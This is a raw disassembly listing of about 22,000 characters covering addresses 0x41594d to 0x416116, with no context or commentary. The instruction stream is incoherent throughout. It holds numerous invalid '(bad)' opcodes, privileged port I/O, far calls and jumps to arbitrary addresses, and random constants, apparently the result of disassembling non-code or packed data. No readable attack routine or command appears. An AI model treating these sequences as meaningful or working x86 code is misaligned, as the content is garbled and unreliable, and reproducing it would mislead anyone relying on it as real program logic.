  41594d:	mov    fs,WORD PTR [esp+ebp*4-0x3a300d33]
  415954:	push   cs
  415955:	dec    edi
  415956:	mov    cl,0xfe
  415958:	rcr    BYTE PTR cs:[ebx-0x34],cl
  41595c:	retf   0xb3b1
  41595f:	adc    dl,dl
  415961:	xor    eax,0xf9190510
  415966:	mov    ecx,0xadd83469
  41596b:	and    eax,0xdfc4eb80
  415970:	push   es
  415971:	push   esp
  415972:	sub    DWORD PTR [ebx+0x891e1d9],edx
  415978:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415979:	add    ebp,DWORD PTR [ebx+0x29]
  41597c:	xchg   ecx,eax
  41597d:	or     eax,0x6c4e400e
  415982:	add    al,0xfb
  415984:	test   al,0x91
  415986:	xor    esp,DWORD PTR ds:0xb92682f
  41598c:	adc    DWORD PTR [ebx+0x5a2a31c1],ebp
  415992:	jp     0x415951
  415994:	in     eax,0x96
  415996:	aas    
  415997:	leave  
  415998:	and    ebp,DWORD PTR [eax+0x33]
  41599b:	dec    esp
  41599c:	sub    BYTE PTR [edi],0x6
  41599f:	nop
  4159a0:	jecxz  0x4159e6
  4159a2:	packuswb mm2,QWORD PTR [ecx-0x72]
  4159a6:	mov    bh,0xe4
  4159a8:	shr    DWORD PTR [ebp+0x2f],1
  4159ab:	jne    0x415970
  4159ad:	jo     0x41599e
  4159af:	or     al,al
  4159b1:	add    bl,BYTE PTR [edx-0x3e5fb5f2]
  4159b7:	js     0x415971
  4159b9:	cmp    DWORD PTR [eax],edi
  4159bb:	push   edx
  4159bc:	cmp    DWORD PTR fs:[edx+0x78],0xd2cab096
  4159c4:	pop    ebp
  4159c5:	cld    
  4159c6:	inc    esp
  4159c7:	loope  0x415a2d
  4159c9:	out    dx,eax
  4159ca:	in     eax,dx
  4159cb:	jmp    0x41596f
  4159cd:	in     eax,dx
  4159ce:	into   
  4159cf:	loop   0x4159f0
  4159d1:	sbb    BYTE PTR [edi+0x4c131a25],bh
  4159d7:	push   esi
  4159d8:	mov    ah,0x52
  4159da:	inc    edi
  4159db:	popa   
  4159dc:	(bad)  
  4159dd:	or     al,0x8b
  4159df:	inc    ecx
  4159e0:	mov    DWORD PTR [edi+0x47],edi
  4159e3:	pop    ds
  4159e4:	dec    edx
  4159e5:	inc    edi
  4159e6:	or     al,0x41
  4159e8:	jbe    0x4159bd
  4159ea:	or     ebp,ebp
  4159ec:	or     eax,0x81c8387f
  4159f1:	mov    bl,0x41
  4159f3:	jg     0x415995
  4159f5:	sub    eax,0x4622f3f5
  4159fa:	or     dl,BYTE PTR [edi+0x1006e392]
  415a00:	or     eax,DWORD PTR [eax+0x28ad4adf]
  415a06:	sti    
  415a07:	call   0x6acf2d95
  415a0c:	mov    bh,0xcf
  415a0e:	push   0x1d8a5d66
  415a13:	repnz sbb al,al
  415a16:	pushf  
  415a17:	std    
  415a18:	dec    eax
  415a19:	xor    ch,BYTE PTR [eax]
  415a1b:	cmc    
  415a1c:	pop    DWORD PTR [ecx]
  415a1e:	lahf   
  415a1f:	(bad)  
  415a20:	dec    DWORD PTR [edi-0x46447fe1]
  415a26:	jbe    0x415a04
  415a28:	leave  
  415a29:	mov    esp,0x1b77ec84
  415a2e:	inc    esp
  415a2f:	dec    esp
  415a30:	xor    DWORD PTR [esp+eiz*4],ebx
  415a33:	(bad)  
  415a35:	cmp    BYTE PTR [ebx-0x2ca34c70],ah
  415a3b:	jg     0x415a2b
  415a3d:	retf   0x222
  415a40:	sub    DWORD PTR [eax],ebx
  415a42:	ja     0x415a6c
  415a44:	inc    ecx
  415a45:	jecxz  0x415a1c
  415a47:	cdq    
  415a48:	and    esi,edi
  415a4a:	fs fcom st(5)
  415a4d:	into   
  415a4e:	xor    BYTE PTR [ecx-0xe],0x5c
  415a52:	mov    ch,0xeb
  415a54:	or     cl,BYTE PTR [ecx+0x6e5240c1]
  415a5a:	stos   BYTE PTR es:[edi],al
  415a5b:	sbb    DWORD PTR [esi-0x1b894425],eax
  415a61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a62:	jecxz  0x415adf
  415a64:	lahf   
  415a65:	or     DWORD PTR [edi-0x4d],esp
  415a68:	xchg   ecx,eax
  415a69:	call   0x817d:0xf50ea65
  415a70:	sub    esi,DWORD PTR [edi-0x564fb6df]
  415a76:	pop    ebx
  415a77:	mov    ds:0x6529c45c,eax
  415a7c:	imul   ebp,DWORD PTR [eax-0x1],0xffffffc0
  415a80:	or     bh,BYTE PTR [ebx-0x45301afe]
  415a86:	push   0x78
  415a88:	jo     0x415a75
  415a8a:	mov    ecx,0x18da46a1
  415a8f:	dec    esi
  415a90:	aad    0x9c
  415a92:	outs   dx,BYTE PTR ds:[esi]
  415a93:	fadd   QWORD PTR [edx-0x65]
  415a96:	sbb    eax,0x669160ba
  415a9b:	inc    ebp
  415a9c:	pop    eax
  415a9d:	(bad)  [esi]
  415a9f:	je     0x415a5e
  415aa1:	mov    ebp,0xcc8029dc
  415aa6:	in     al,0xf2
  415aa8:	icebp  
  415aa9:	mov    ah,0x63
  415aab:	fimul  WORD PTR [eax-0x31]
  415aae:	mov    esi,DWORD PTR [ebp-0x50]
  415ab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ab2:	sub    DWORD PTR [ecx],edx
  415ab4:	mov    BYTE PTR [eax],dh
  415ab6:	cmp    DWORD PTR ds:0x79d85712,ebp
  415abc:	pusha  
  415abd:	in     al,0x20
  415abf:	int    0xf6
  415ac1:	jle    0x415a67
  415ac3:	pop    ss
  415ac4:	cmc    
  415ac5:	sub    DWORD PTR [esi-0x546037a],ecx
  415acb:	loopne 0x415aab
  415acd:	jp     0x415b1f
  415acf:	xor    eax,0x22960417
  415ad4:	fstp   DWORD PTR [edx+0x13518752]
  415ada:	jle    0x415a6c
  415adc:	adc    al,BYTE PTR [edx+0x1d]
  415adf:	xchg   DWORD PTR [eax-0x2b],esi
  415ae2:	loop   0x415b21
  415ae4:	sub    al,0xef
  415ae6:	cmp    DWORD PTR [edi+0x2],0x2a
  415aea:	or     DWORD PTR [ebx+0x6a],edx
  415aed:	sbb    ah,0xb9
  415af0:	mov    ecx,DWORD PTR [edx]
  415af2:	cmp    ebx,DWORD PTR [eax]
  415af4:	mov    cl,0xd5
  415af6:	iret   
  415af7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415af8:	xlat   BYTE PTR ds:[ebx]
  415af9:	clc    
  415afa:	xlat   BYTE PTR ds:[ebx]
  415afb:	call   0x514:0x42ecbd0
  415b02:	nop
  415b03:	or     eax,0x8802aeaa
  415b08:	fst    QWORD PTR [ebp+0x44]
  415b0b:	pusha  
  415b0c:	daa    
  415b0d:	outs   dx,BYTE PTR ds:[esi]
  415b0e:	mov    cl,0x24
  415b10:	retf   
  415b11:	(bad)  
  415b13:	pop    edx
  415b14:	xor    dl,ch
  415b16:	pop    ss
  415b17:	dec    esp
  415b18:	mov    ch,0x7f
  415b1a:	sbb    eax,0x3bfddcca
  415b1f:	jnp    0x415ae5
  415b21:	mov    ebx,0xd44db3e8
  415b26:	loop   0x415b29
  415b28:	add    BYTE PTR [ebx-0x14],ch
  415b2b:	lds    eax,FWORD PTR [edi+0x13a513f0]
  415b31:	pop    edi
  415b32:	fsubr  st(6),st
  415b34:	mov    esp,0xf80ca2b3
  415b39:	ss out dx,eax
  415b3b:	sub    al,0x28
  415b3d:	cli    
  415b3e:	in     eax,dx
  415b3f:	aaa    
  415b40:	cdq    
  415b41:	sub    DWORD PTR [edx-0x4672ef0],ecx
  415b47:	xchg   edx,eax
  415b48:	pop    ebx
  415b49:	dec    ebx
  415b4a:	inc    ecx
  415b4b:	or     DWORD PTR [eax+0x1e],eax
  415b4e:	xchg   BYTE PTR [edx-0x30],bl
  415b51:	scas   eax,DWORD PTR es:[edi]
  415b52:	cmp    DWORD PTR [eax+0x461939e9],ebp
  415b58:	frstor [esi+0x7c43ab88]
  415b5e:	jb     0x415b31
  415b60:	mov    BYTE PTR [ebx],cl
  415b62:	fisubr WORD PTR [edx-0xc1b25d6]
  415b68:	fs jl  0x415bc2
  415b6b:	jmp    0x3f77efbc
  415b70:	push   edx
  415b71:	out    dx,eax
  415b72:	xor    al,0xb5
  415b74:	mov    eax,ds:0xf64c351f
  415b79:	int3   
  415b7a:	fld    TBYTE PTR [eax+0x6d1b0dbc]
  415b80:	sub    eax,0x46a13a83
  415b85:	jmp    0xae45:0x2ea478ee
  415b8c:	push   edi
  415b8d:	add    cl,ah
  415b8f:	xchg   esi,eax
  415b90:	sub    ecx,DWORD PTR [eax+0x6f]
  415b93:	mov    dh,dh
  415b95:	push   eax
  415b96:	cld    
  415b97:	ins    DWORD PTR es:[edi],dx
  415b98:	lods   eax,DWORD PTR ds:[esi]
  415b99:	add    al,0xde
  415b9b:	jmp    0xbfc4ac9c
  415ba0:	call   0x70e02480
  415ba5:	push   edi
  415ba6:	mov    es,WORD PTR [ebp+ecx*1-0xf]
  415baa:	push   esp
  415bab:	jae    0x415bb4
  415bad:	adc    ch,al
  415baf:	xchg   BYTE PTR [ebx+0x19],cl
  415bb2:	outs   dx,DWORD PTR ds:[esi]
  415bb3:	je     0x415bb4
  415bb5:	push   ds
  415bb6:	cs push ecx
  415bb8:	or     BYTE PTR [edi-0x66],dl
  415bbb:	inc    ebp
  415bbc:	das    
  415bbd:	ret    
  415bbe:	cmp    eax,DWORD PTR [esi]
  415bc0:	rcr    DWORD PTR [ecx+0x3b],0x9a
  415bc4:	jmp    0x3cd4dbb2
  415bc9:	dec    ebp
  415bca:	pop    ds
  415bcb:	lods   al,BYTE PTR ds:[esi]
  415bcc:	xchg   edx,eax
  415bcd:	mov    ds:0xaf72ef0,eax
  415bd2:	test   DWORD PTR [edx],esi
  415bd4:	mov    BYTE PTR [ebx-0x23b43196],bl
  415bda:	sbb    al,BYTE PTR [ecx+0x44eb7bb5]
  415be0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415be1:	mov    esi,0xd9228058
  415be6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415be7:	and    esp,DWORD PTR ds:0x1735b159
  415bed:	imul   edx,DWORD PTR [edi+ebx*2],0x2e
  415bf1:	btc    DWORD PTR [edx-0x40],ebx
  415bf5:	add    eax,0x3d3ee98e
  415bfa:	add    BYTE PTR [edx],0xe3
  415bfd:	aas    
  415bfe:	xchg   esp,eax
  415bff:	jae    0x415bc1
  415c01:	adc    eax,0xee008a9b
  415c06:	into   
  415c07:	or     esi,0xfffffff1
  415c0a:	fistp  DWORD PTR [edi-0x37]
  415c0d:	jns    0x415b9e
  415c0f:	in     eax,dx
  415c10:	adc    eax,0x4dbba733
  415c15:	pusha  
  415c16:	cmp    DWORD PTR [edi-0x1663ae3f],edx
  415c1c:	rcr    BYTE PTR [edx-0x291f8db9],cl
  415c22:	xchg   DWORD PTR [esi+0x28],esi
  415c25:	cmp    esi,DWORD PTR [edx]
  415c27:	test   DWORD PTR [esi+0x5969a524],edx
  415c2d:	cld    
  415c2e:	punpckldq mm1,DWORD PTR [esi+ebp*2]
  415c32:	arpl   WORD PTR [eax],cx
  415c34:	(bad)  
  415c36:	adc    al,0xe7
  415c38:	hlt    
  415c39:	jbe    0x415be5
  415c3b:	mov    bh,0xd6
  415c3d:	lods   eax,DWORD PTR ds:[esi]
  415c3e:	push   ecx
  415c3f:	push   esp
  415c40:	pop    esp
  415c41:	mov    cl,0x2d
  415c43:	ret    
  415c44:	mov    ebp,0xb71aaa07
  415c49:	mov    ebx,0x710f8338
  415c4e:	pop    ecx
  415c4f:	sbb    eax,0x818f6ebc
  415c54:	sub    esi,ecx
  415c56:	neg    BYTE PTR [edx+0x65]
  415c59:	or     DWORD PTR [ebx-0x34],edx
  415c5c:	sbb    dh,BYTE PTR [eax+0x47dabbfd]
  415c62:	ins    DWORD PTR es:[edi],dx
  415c63:	push   es
  415c64:	fimul  WORD PTR [edi+0x3]
  415c67:	jne    0x415c99
  415c69:	inc    esi
  415c6a:	popa   
  415c6b:	jge    0x415c79
  415c6d:	inc    ecx
  415c6e:	cmp    eax,0x79313681
  415c73:	dec    esi
  415c74:	into   
  415c75:	stc    
  415c76:	dec    edi
  415c77:	stos   DWORD PTR es:[edi],eax
  415c78:	loopne 0x415ce2
  415c7a:	out    dx,al
  415c7b:	in     eax,0x48
  415c7d:	push   esp
  415c7e:	mov    BYTE PTR [eax+0x4de42600],cl
  415c84:	hlt    
  415c85:	xchg   DWORD PTR [ecx-0x45],edx
  415c88:	dec    esi
  415c89:	mov    eax,ds:0xc9eca320
  415c8e:	pusha  
  415c8f:	and    al,0xc4
  415c91:	jmp    0x415cc8
  415c93:	jbe    0x415d0e
  415c95:	and    ecx,eax
  415c97:	push   ebx
  415c98:	push   ebx
  415c99:	sbb    BYTE PTR [eax+0xc],dh
  415c9c:	inc    edi
  415c9d:	scas   eax,DWORD PTR es:[edi]
  415c9e:	cmp    bh,al
  415ca0:	cmp    BYTE PTR [ebp+0x5],dl
  415ca3:	jg     0x415c45
  415ca5:	ret    
  415ca6:	not    DWORD PTR [ecx]
  415ca8:	call   0xfb43ec31
  415cad:	ret    0x2fa5
  415cb0:	mov    ah,0xec
  415cb2:	adc    edx,DWORD PTR [ebx+0x43bcacc9]
  415cb8:	mov    al,ss:0x494e7728
  415cbe:	lock aaa 
  415cc0:	cdq    
  415cc1:	clc    
  415cc2:	stc    
  415cc3:	mov    ss,ecx
  415cc5:	add    bh,ah
  415cc7:	push   ecx
  415cc8:	(bad)  
  415cc9:	fs inc esp
  415ccb:	xchg   BYTE PTR [eax-0x11c25447],al
  415cd1:	cmp    al,0x55
  415cd3:	push   edx
  415cd4:	sub    al,0x53
  415cd6:	mov    dl,0x55
  415cd8:	aad    0x91
  415cda:	jae    0x415c82
  415cdc:	xor    ah,BYTE PTR [ecx+0x75]
  415cdf:	jmp    0x140d8e95
  415ce4:	repz dec ebp
  415ce6:	in     al,dx
  415ce7:	out    0x7c,eax
  415ce9:	das    
  415cea:	push   ds
  415ceb:	fs addr16 push cs
  415cee:	(bad)  
  415cef:	xchg   ebp,eax
  415cf0:	cmc    
  415cf1:	xchg   BYTE PTR [eax+0x55347df6],dh
  415cf7:	or     DWORD PTR [eax-0xf8d2471],edx
  415cfd:	mov    DWORD PTR [edi],eax
  415cff:	cwde   
  415d00:	out    dx,al
  415d01:	sbb    eax,0x39154fd3
  415d06:	lds    eax,FWORD PTR [ecx+0x3ec731f0]
  415d0c:	ret    0xf66
  415d0f:	mov    edx,ebp
  415d11:	cdq    
  415d12:	push   ds
  415d13:	cli    
  415d14:	pusha  
  415d15:	sbb    DWORD PTR [ebx],esi
  415d17:	sti    
  415d18:	jo     0x415d5b
  415d1a:	cmp    edx,edx
  415d1c:	cmp    edi,edx
  415d1e:	xchg   ebp,eax
  415d1f:	test   al,0xac
  415d21:	mov    ebp,0x1106b1cb
  415d26:	xlat   BYTE PTR ds:[ebx]
  415d27:	mov    ds:0x41265603,al
  415d2c:	inc    esi
  415d2d:	fstp   DWORD PTR ds:0xf4ede403
  415d33:	jmp    0x2c8a3510
  415d38:	jns    0x415ce1
  415d3a:	adc    al,0x42
  415d3c:	adc    al,0x3d
  415d3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d3f:	cmp    ebx,DWORD PTR [ecx]
  415d41:	push   cs
  415d42:	push   ss
  415d43:	hlt    
  415d44:	sub    DWORD PTR [eax],eax
  415d46:	inc    esi
  415d47:	les    edi,FWORD PTR [ecx-0x6fef8ef0]
  415d4d:	push   ebx
  415d4e:	inc    eax
  415d4f:	call   0x6e40:0xbbe96b94
  415d56:	dec    esp
  415d57:	clc    
  415d58:	xor    BYTE PTR [eax-0x32ed5397],0x51
  415d5f:	adc    ebp,DWORD PTR [esi+0x2]
  415d62:	fist   DWORD PTR [ecx-0x77a7afe1]
  415d68:	aaa    
  415d69:	jno    0x415d0d
  415d6b:	xor    al,0xcc
  415d6d:	loop   0x415dc7
  415d6f:	xor    eax,0xedce6e24
  415d74:	lea    ebx,[edi+0x5cd6f015]
  415d7a:	fiadd  DWORD PTR [ebx+0xae17180]
  415d80:	popf   
  415d81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d82:	cli    
  415d83:	fucom  st(0)
  415d85:	cs push ebp
  415d87:	sbb    al,bh
  415d89:	out    0xdd,eax
  415d8b:	in     al,0xf3
  415d8d:	sub    al,0xf5
  415d8f:	push   esi
  415d90:	dec    edx
  415d91:	add    al,0xa2
  415d93:	adc    dl,al
  415d95:	fld    DWORD PTR [esi-0x7d4d3dca]
  415d9b:	fwait
  415d9c:	(bad)  
  415d9d:	fmul   st(2),st
  415d9f:	push   ss
  415da0:	cmc    
  415da1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415da2:	mov    bl,0x2d
  415da4:	xchg   edx,eax
  415da6:	cmc    
  415da7:	and    edx,DWORD PTR [ecx+edx*1]
  415daa:	std    
  415dab:	push   es
  415dac:	call   0x8a4f6d90
  415db1:	xor    eax,0xc5b12265
  415db6:	push   ebx
  415db7:	pop    DWORD PTR [esp+edi*4+0x5a29c5c7]
  415dbe:	or     eax,0x1d8bf11c
  415dc3:	ror    DWORD PTR [esi],0x79
  415dc6:	leave  
  415dc7:	sub    al,0xea
  415dc9:	popf   
  415dca:	call   0x8f8:0x9a1def6b
  415dd1:	test   eax,0x35d49c13
  415dd6:	cld    
  415dd7:	mov    eax,ds:0x4b138312
  415ddd:	out    dx,al
  415dde:	call   0x4028778c
  415de3:	sub    eax,0xff275564
  415de8:	loope  0x415dce
  415dea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415deb:	xchg   ebx,eax
  415dec:	sbb    al,0xc2
  415dee:	(bad)  
  415def:	out    0x8,al
  415df1:	push   0x7c4f9bd1
  415df6:	lock or ah,BYTE PTR [eax-0x20]
  415dfa:	mov    DWORD PTR [edx],edi
  415dfc:	push   eax
  415dfd:	xchg   edx,eax
  415dfe:	clc    
  415dff:	pop    esp
  415e00:	(bad)  
  415e01:	jp     0x415e15
  415e03:	pushf  
  415e04:	fwait
  415e05:	das    
  415e06:	xor    ch,BYTE PTR [edx]
  415e08:	idiv   dh
  415e0a:	pop    ebp
  415e0b:	adc    eax,0xd2b5e0d7
  415e10:	inc    esp
  415e11:	rcr    esp,1
  415e13:	xchg   ebx,eax
  415e14:	cli    
  415e15:	repz jg 0x415e26
  415e18:	fisttp DWORD PTR [ebp-0x51037920]
  415e1e:	inc    ecx
  415e1f:	xchg   esi,eax
  415e20:	mov    al,0x61
  415e22:	je     0x415e3a
  415e24:	int3   
  415e25:	xchg   edx,eax
  415e26:	cli    
  415e27:	inc    ebx
  415e28:	scas   al,BYTE PTR es:[edi]
  415e29:	outs   dx,BYTE PTR ds:[esi]
  415e2a:	mov    edx,0xc4158f5c
  415e2f:	daa    
  415e30:	gs addr16 into 
  415e33:	retf   
  415e34:	fst    DWORD PTR [edx]
  415e36:	adc    ebx,0x721d217c
  415e3c:	test   DWORD PTR [ebp-0x6147fd34],eax
  415e42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e43:	stos   DWORD PTR es:[edi],eax
  415e44:	(bad)  
  415e45:	pushf  
  415e46:	outs   dx,DWORD PTR ds:[esi]
  415e47:	jmp    0xc7e199bd
  415e4c:	xor    bl,BYTE PTR [eax]
  415e4e:	or     ah,BYTE PTR [edi]
  415e50:	aas    
  415e51:	xor    ecx,DWORD PTR [edx-0x461a65f]
  415e57:	adc    eax,0x4a75db7f
  415e5c:	pop    ebp
  415e5d:	sub    bl,bl
  415e5f:	lods   eax,DWORD PTR ds:[esi]
  415e60:	cmp    ch,BYTE PTR [ebx-0x47]
  415e63:	inc    edi
  415e64:	test   BYTE PTR [edi-0x3c],cl
  415e67:	aad    0x6f
  415e69:	popw   ds
  415e6b:	lods   eax,DWORD PTR ds:[esi]
  415e6c:	imul   esp,DWORD PTR [edi-0xd78c36d],0x64
  415e73:	adc    ecx,DWORD PTR [eax-0x1e]
  415e76:	call   0x932e48b4
  415e7b:	inc    eax
  415e7c:	cli    
  415e7d:	dec    esi
  415e7e:	repnz lock dec ebp
  415e81:	dec    eax
  415e82:	cmc    
  415e83:	pusha  
  415e84:	mov    bl,0x49
  415e86:	jge    0x415e38
  415e88:	add    eax,0x39759fa4
  415e8d:	add    ah,BYTE PTR [esi]
  415e8f:	aam    0x11
  415e91:	ficom  WORD PTR [edi+0x3]
  415e94:	inc    ecx
  415e95:	cli    
  415e96:	into   
  415e97:	lea    ebp,[eax]
  415e99:	and    eax,0x709167ee
  415e9e:	cmp    BYTE PTR [eax+0x5a],0xc0
  415ea2:	fisubr WORD PTR [esi-0x17e7dc44]
  415ea8:	rcl    dh,0xfc
  415eab:	pop    es
  415eac:	jle    0x415e3d
  415eae:	addr16 or al,0x55
  415eb1:	mov    bh,0x49
  415eb3:	int3   
  415eb4:	inc    ecx
  415eb5:	dec    ecx
  415eb6:	dec    ecx
  415eb7:	sbb    DWORD PTR [edx],ebp
  415eb9:	test   BYTE PTR [ebx],al
  415ebb:	adc    bh,0xaf
  415ebe:	pop    eax
  415ebf:	sub    eax,0xef98fd9e
  415ec4:	das    
  415ec5:	shr    BYTE PTR [ebx-0x2b],1
  415ec8:	mov    edi,0x6e815d3a
  415ecd:	ret    
  415ece:	imul   esp,esp,0xcbb2d15
  415ed4:	or     al,0x61
  415ed6:	imul   eax,DWORD PTR [ecx+0x30],0x9
  415eda:	stos   BYTE PTR es:[edi],al
  415edb:	ins    BYTE PTR es:[edi],dx
  415edc:	aaa    
  415edd:	or     ecx,DWORD PTR ds:[eax+0x5bcc0952]
  415ee4:	aas    
  415ee5:	stc    
  415ee6:	gs mov ebp,0x3fc2d49b
  415eec:	or     al,0xc3
  415eee:	fld    QWORD PTR [ebp-0x66]
  415ef1:	jns    0x415efd
  415ef3:	sub    BYTE PTR [edi+0x1d],al
  415ef6:	aas    
  415ef7:	pusha  
  415ef8:	pop    eax
  415ef9:	mov    ecx,0x5470f7dc
  415efe:	mov    bl,0xfd
  415f00:	sbb    eax,0xfa1b6b72
  415f05:	cmp    BYTE PTR [edx+0x5f],dl
  415f08:	mov    bl,0x0
  415f0a:	inc    ebp
  415f0b:	add    DWORD PTR [edx+0x439c6aa],edi
  415f11:	aad    0x73
  415f13:	call   0xc4fa:0x97375c56
  415f1a:	and    eax,0x87942050
  415f1f:	jmp    0xbad04de5
  415f24:	popa   
  415f25:	ss inc esi
  415f27:	xor    BYTE PTR [esi+0xfa78d8d],dh
  415f2d:	fwait
  415f2e:	inc    edi
  415f2f:	loope  0x415f97
  415f31:	push   edi
  415f32:	cmp    BYTE PTR [ecx],dh
  415f34:	add    al,0x42
  415f36:	repnz dec ecx
  415f38:	sub    eax,0x1451d861
  415f3d:	or     edx,esi
  415f3f:	lahf   
  415f40:	das    
  415f41:	icebp  
  415f42:	or     DWORD PTR [ebx+ebp*1],esi
  415f45:	xor    al,dl
  415f47:	xchg   ecx,eax
  415f48:	add    BYTE PTR [ebp-0x18aae75f],cl
  415f4e:	xchg   DWORD PTR [eax-0x6],edi
  415f51:	lods   al,BYTE PTR ds:[esi]
  415f52:	pop    edx
  415f53:	shl    DWORD PTR [ecx],0x7c
  415f56:	push   ebx
  415f57:	mov    ch,0x8a
  415f59:	add    DWORD PTR [edx-0x69c8f59f],ebp
  415f5f:	jp     0x415eee
  415f61:	std    
  415f62:	sub    DWORD PTR [ecx+0x53a000a6],ecx
  415f68:	les    esp,FWORD PTR [esi]
  415f6a:	icebp  
  415f6b:	dec    eax
  415f6c:	lods   eax,DWORD PTR ss:[esi]
  415f6e:	out    dx,al
  415f6f:	xchg   BYTE PTR [edx],ch
  415f71:	jns    0x415fc3
  415f73:	out    0xc2,al
  415f75:	cmp    DWORD PTR [esi+0x576acf25],edi
  415f7b:	shr    BYTE PTR [ebx+eiz*2-0xe6918f7],1
  415f82:	inc    ebp
  415f83:	call   0xd6539688
  415f88:	mov    bl,0x40
  415f8a:	mov    dh,0x75
  415f8c:	xor    BYTE PTR [edi-0x27],cl
  415f8f:	or     DWORD PTR [edx+0x69],eax
  415f92:	mov    dh,0x22
  415f94:	inc    ebx
  415f95:	call   0xa585d3d2
  415f9a:	(bad)  
  415f9b:	push   ecx
  415f9c:	xchg   ecx,eax
  415f9d:	aam    0x27
  415f9f:	dec    ecx
  415fa0:	loop   0x415f86
  415fa2:	jp     0x415fa4
  415fa4:	mov    edi,0xe8298c8
  415fa9:	mov    ebx,0x104c61ef
  415fae:	or     BYTE PTR [ecx-0x56d97d47],dh
  415fb4:	push   edx
  415fb5:	out    0x44,al
  415fb7:	adc    DWORD PTR [edx+0x23],0xffffffaa
  415fbb:	mov    DWORD PTR [ebp+0x2e],ecx
  415fbe:	mov    ecx,0x56806d70
  415fc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fc4:	fsub   st,st(6)
  415fc6:	jg     0x415f78
  415fc8:	sbb    bh,BYTE PTR [edi]
  415fca:	jne    0x416014
  415fcc:	loopne 0x415f56
  415fce:	pop    esp
  415fcf:	out    dx,al
  415fd0:	les    edx,FWORD PTR ds:0xa021
  415fd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fd6:	out    dx,al
  415fd7:	arpl   dx,cx
  415fd9:	adc    eax,0xc78444f4
  415fde:	(bad)  [ecx+0x24]
  415fe1:	mov    ebp,0xc64e78fc
  415fe6:	sub    ebx,ebp
  415fe8:	gs fsubp st(1),st
  415feb:	jb     0x415fc2
  415fed:	and    BYTE PTR [eax],dl
  415fef:	mov    dh,0x75
  415ff1:	loopne 0x415f8f
  415ff3:	adc    eax,0xaabd637a
  415ff8:	fadd   st(1),st
  415ffa:	mov    edi,0x50341e71
  415fff:	outs   dx,DWORD PTR ds:[esi]
  416000:	mov    bl,0x3c
  416002:	imul   eax,DWORD PTR [ebp-0xb900d04],0x53054f15
  41600c:	jge    0x415ff0
  41600e:	in     al,dx
  41600f:	les    ecx,FWORD PTR [edx]
  416011:	ret    0x917d
  416014:	fcmovne st,st(1)
  416016:	sub    dh,BYTE PTR [eax-0x54]
  416019:	scas   al,BYTE PTR es:[edi]
  41601a:	mov    dl,0x40
  41601c:	xlat   BYTE PTR gs:[ebx]
  41601e:	xor    ebp,eax
  416020:	jg     0x416031
  416022:	test   BYTE PTR [ebx+0xcd32f01],ah
  416028:	add    DWORD PTR [edx+0x76235766],esp
  41602e:	and    eax,0x34879fb7
  416033:	bound  eax,QWORD PTR [edi+0x7b]
  416036:	gs jns 0x415fc8
  416039:	xor    esi,ecx
  41603b:	sbb    eax,0x97d4638a
  416040:	mov    ecx,ss
  416042:	sti    
  416043:	push   edi
  416044:	popa   
  416045:	jecxz  0x415fcd
  416047:	adc    ebp,ecx
  416049:	stos   DWORD PTR es:[edi],eax
  41604a:	int3   
  41604b:	ret    
  41604c:	mov    dl,0xb6
  41604e:	or     BYTE PTR [ebp+0x1e4af3bd],0x29
  416055:	sbb    DWORD PTR [ebx-0x2f965688],0x5c
  41605c:	adc    al,0xdc
  41605e:	inc    ebp
  41605f:	and    bh,dh
  416061:	cmp    DWORD PTR [ecx-0x5b],0xdcbb7626
  416068:	sub    DWORD PTR [ecx+0x20],eax
  41606b:	pop    es
  41606c:	pushf  
  41606d:	push   es
  41606e:	mov    esp,DWORD PTR [bx+di]
  416071:	mov    al,0x16
  416073:	call   0x2d455669
  416078:	jecxz  0x416015
  41607a:	ret    0x8184
  41607d:	test   eax,0x3c8f0992
  416082:	xchg   esi,eax
  416083:	add    DWORD PTR [eax+0x79],esi
  416086:	inc    esi
  416087:	mov    ebx,0xce3770f6
  41608c:	cmp    eax,0xb85360f
  416091:	jo     0x416031
  416093:	pop    esi
  416094:	sbb    bl,BYTE PTR [edx-0x3a0dfbc0]
  41609a:	ja     0x4160f3
  41609c:	push   cs
  41609d:	fucom  st(1)
  41609f:	xchg   DWORD PTR ss:0xce85f8bf,eax
  4160a6:	int    0x3d
  4160a8:	(bad)  
  4160a9:	inc    ecx
  4160aa:	sbb    ecx,DWORD PTR [edx-0x49]
  4160ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160ae:	js     0x416116
  4160b0:	mov    ds:0x306b8e0b,al
  4160b5:	xchg   BYTE PTR [ecx-0x2d],dl
  4160b8:	sub    eax,0x758eb599
  4160bd:	sub    edi,DWORD PTR [ebp+0x61]
  4160c0:	mov    esp,0x75d77c71
  4160c5:	push   ds
  4160c6:	and    dl,BYTE PTR [ebp+0x587e0281]
  4160cc:	cmc    
  4160cd:	sbb    eax,0xdf4c04a
  4160d2:	push   edx
  4160d3:	shl    DWORD PTR [edx+0x7a87b46],cl
  4160d9:	adc    cl,BYTE PTR [eax+0x34]
  4160dc:	dec    eax
  4160dd:	jbe    0x416095
  4160df:	bound  ebp,QWORD PTR [ebp-0x37568060]
  4160e5:	jge    0x41609b
  4160e7:	push   ss
  4160e8:	xchg   ebx,eax
  4160e9:	out    0x88,eax
  4160eb:	dec    edi
  4160ec:	or     al,0xbf
  4160ee:	jmp    0xb2f533a9
  4160f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160f4:	outs   dx,DWORD PTR ds:[esi]
  4160f5:	test   eax,ebx
  4160f7:	repnz cmp eax,0xdc4daa26
  4160fd:	iret   
  4160fe:	add    eax,0xcfdf1b03
  416103:	daa    
  416104:	fdiv   DWORD PTR [edi+0x4b]
  416107:	mov    esi,0x45524077
  41610c:	mov    WORD PTR [ebx+ecx*8],fs
  41610f:	add    bl,BYTE PTR [esi]
  416111:	cmp    eax,0x5f9f9c27
  416116:	pushf  
